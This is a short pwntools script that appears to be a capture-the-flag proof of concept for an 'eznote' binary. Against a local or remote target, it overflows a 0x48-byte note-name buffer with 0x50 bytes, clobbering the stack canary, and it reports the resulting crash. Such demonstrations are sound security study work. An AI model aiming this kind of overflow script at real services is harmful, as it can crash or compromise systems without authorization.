#!/usr/bin/env python3
from pwn import *
import argparse
import re
import time
from subprocess import STDOUT


def parse_args():
    p = argparse.ArgumentParser(description="Demonstrate eznote note-name stack overflow")
    p.add_argument("--binary", default="chall", help="Path to local binary")
    p.add_argument("--host", help="Remote host")
    p.add_argument("--port", type=int, help="Remote port")
    p.add_argument("--timeout", type=float, default=2.0, help="Read timeout in seconds")
    return p.parse_args()


def start(args):
    if args.host and args.port:
        return remote(args.host, args.port)
    return process(args.binary, stderr=STDOUT)


def recv_all(io, timeout):
    buf = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        chunk = io.recv(timeout=0.2)
        if chunk:
            buf += chunk
    return buf


def main():
    args = parse_args()
    io = start(args)

    io.recvuntil(b"Username:")
    io.sendline(b"user")

    io.recvuntil(b"> ")
    io.sendline(b"3")

    io.recvuntil(b"note name:")
    # Buffer is 0x48 bytes (rbp-0x50 to rbp-0x8), but read() takes 0x50 bytes
    # This overwrites 8 bytes into the canary at rbp-0x8
    payload = b"A" * 0x50  # 0x48 buffer + 8 bytes into canary
    io.send(payload + b"\n")

    io.recvuntil(b"Note length:")
    io.sendline(b"1")

    io.recvuntil(b"Note content:")
    io.send(b"A")

    io.recvuntil(b"> ")
    io.sendline(b"5")

    buf = recv_all(io, args.timeout)

    if re.search(rb"stack smashing detected|Aborted", buf):
        print("Crash detected (stack canary tripped).")
    elif not buf:
        print("Connection closed (likely crash).")
    else:
        print(buf.decode(errors="replace"))


if __name__ == "__main__":
    main()
